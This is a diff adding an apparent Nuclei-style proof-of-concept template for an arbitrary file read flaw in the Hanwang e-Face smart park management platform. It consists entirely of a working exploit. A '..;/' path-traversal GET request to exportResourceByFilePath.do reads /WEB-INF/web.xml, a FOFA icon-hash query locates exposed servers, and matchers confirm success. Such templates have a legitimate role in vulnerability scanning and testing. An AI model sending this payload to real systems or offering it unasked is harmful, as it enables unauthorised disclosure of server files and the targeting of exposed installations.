@@ -1,0 +1,28 @@
+id: poc-yaml-hw-e-face-pass-spmp-exportresourcebyfilepath-do-anyfile-read
+info:
+  name: 汉王e脸通智慧园区管理平台 exportResourceByFilePath.do 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  metadata:
+    fingerprint: e脸通智慧园区管理平台
+    fofa-query: icon_hash="1380907357"
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/manage/intercom/..;/..;/manage/leaveList/exportResourceByFilePath.do?filePath=/WEB-INF/web.xml"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "</web-app>"
+          - "<display-name>"
+          - "<listener>"
+      - type: word
+        part: header
+        words:
+          - "filename=\"/WEB-INF/web.xml\""
